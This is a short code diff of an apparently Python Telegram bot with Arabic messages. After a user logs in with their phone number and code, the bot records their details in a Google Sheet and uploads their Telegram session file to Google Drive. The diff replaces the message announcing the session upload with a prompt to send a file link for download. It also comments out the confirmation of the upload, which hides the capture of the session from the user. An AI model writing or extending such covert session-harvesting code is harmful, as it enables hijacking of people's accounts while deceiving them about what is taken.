@@ -208,7 +208,7 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # التحقق من الصلاحيات
         if await client.is_user_authorized():
-            await update.message.reply_text("تم تسجيل الدخول بنجاح! جاري رفع ملف الجلسة...")
+            await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
 
             # تسجيل بيانات المستخدم في Google Sheet
             add_user_to_sheet(user_id, phone_number, update.message.from_user.username, False)
@@ -226,7 +226,7 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     fields='id'
                 ).execute()
 
-                await update.message.reply_text(f"تم رفع الجلسة بنجاح! ID الملف: {uploaded_file.get('id')}")
+                #await update.message.reply_text(f"تم رفع الجلسة بنجاح! ID الملف: {uploaded_file.get('id')}")
                 return FILE
             else:
                 await update.message.reply_text("خطأ: ملف الجلسة غير موجود.")
